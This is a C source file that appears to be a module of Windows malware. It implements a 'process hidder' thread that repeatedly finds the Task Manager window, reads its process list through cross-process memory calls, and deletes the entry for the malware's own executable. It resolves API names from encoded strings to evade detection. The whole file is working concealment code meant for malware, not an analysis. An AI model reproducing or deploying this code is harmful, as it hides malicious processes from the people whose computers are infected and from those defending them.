#include "stuff.h"
#include "externals.h"

#ifndef NO_PROCHIDDER

typedef BOOL (__stdcall *VFE)(HANDLE,LPVOID,SIZE_T,DWORD);
typedef LPVOID (__stdcall *VAE)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL (__stdcall *RPM)(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
typedef BOOL (__stdcall *WPM)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);

VFE fVirtualFreeEx;
VAE fVirtualAllocEx;
RPM fReadProcessMemory;
WPM fWriteProcessMemory;

void LoadNeededDlls()
{
	HMODULE kernel32_dll = LoadLibrary(strings[Decode(dll_kernel32)].encoded);
	if (kernel32_dll)
	{
		fWriteProcessMemory = (WPM)GetProcAddress(kernel32_dll, strings[Decode(dll_WriteProcessMemory)].encoded);
		fVirtualFreeEx = (VFE)GetProcAddress(kernel32_dll, strings[Decode(dll_VirtualFreeEx)].encoded);
		fVirtualAllocEx = (VAE)GetProcAddress(kernel32_dll, strings[Decode(dll_VirtualAllocEx)].encoded);
		fReadProcessMemory = (RPM)GetProcAddress(kernel32_dll, strings[Decode(dll_ReadProcessMemory)].encoded);
	}
}

BOOL CALLBACK Hide(HWND hwnd,LPARAM lParam)
{
	char szClassName[256],
		 szWindowText[256];
		 
	fGetWindowText(hwnd, szWindowText, sizeof(szWindowText));
	fGetClassName(hwnd, szClassName, sizeof(szClassName));

	if (strstr(szWindowText, strings[Decode(s_Processes)].encoded) && strstr(szClassName, strings[Decode(s_SysListView32)].encoded) != 0) 
	{
		char		*_item, szItemText[512], szCurrentFile[MAX_PATH], *p;
		LVITEM		*_lvi, lvi;
		HANDLE		hProcess = NULL;
		int			nTotal;
		DWORD		pid;

		fGetModuleFileName(0, szCurrentFile, sizeof(szCurrentFile));
		p = strrchr(szCurrentFile, '\\');
		*p = 0;
		strcpy(szCurrentFile, p + 1);
   
		nTotal = fSendMessage(hwnd, LVM_GETITEMCOUNT, 0 , 0);
   
		fGetWindowThreadProcessId(hwnd, &pid);
   
		hProcess = fOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);

		_lvi = (LVITEM*) fVirtualAllocEx(hProcess, NULL, sizeof(LVITEM), MEM_COMMIT, PAGE_READWRITE);
		_item = (char*) fVirtualAllocEx(hProcess, NULL, sizeof szItemText, MEM_COMMIT, PAGE_READWRITE);
   
		lvi.cchTextMax = sizeof szItemText;

		for (int i = 0; i < nTotal; i++) 
		{
			lvi.iSubItem = 0;
			lvi.pszText = _item;
			fWriteProcessMemory(hProcess, _lvi, &lvi, sizeof(LVITEM), NULL);
			fSendMessage(hwnd, LVM_GETITEMTEXT, (WPARAM)i, (LPARAM)_lvi);

			if (fReadProcessMemory(hProcess, _item, szItemText, sizeof szItemText, NULL))
				if (!stricmp( szItemText, szCurrentFile))
					fSendMessage(hwnd, LVM_DELETEITEM, (WPARAM) i, 0);
		}

		// cleanup
		fVirtualFreeEx(hProcess, _lvi, 0, MEM_DECOMMIT);
		fVirtualFreeEx(hProcess, _item, 0, MEM_DECOMMIT);
		fVirtualFreeEx(hProcess, _lvi, 0, MEM_RELEASE);
		fVirtualFreeEx(hProcess, _item, 0, MEM_RELEASE);
		fCloseHandle(hProcess);

		return 0;
	} 
	else 
		return 1;
}

DWORD WINAPI SYS_ProcHidder(LPVOID param)
{
	sys_proch_s s = *((sys_proch_s *)param);

#ifdef DEBUG
	printf("Process hidder started...\n");
#endif

	LoadNeededDlls();

    for(;;)  
	{
		Sleep(s.sleeptime);
        fEnumChildWindows(fFindWindow(0, strings[Decode(s_WindowsTaskManager)].encoded), Hide, 0);
    }

	ExitThread(0);
} 

#endif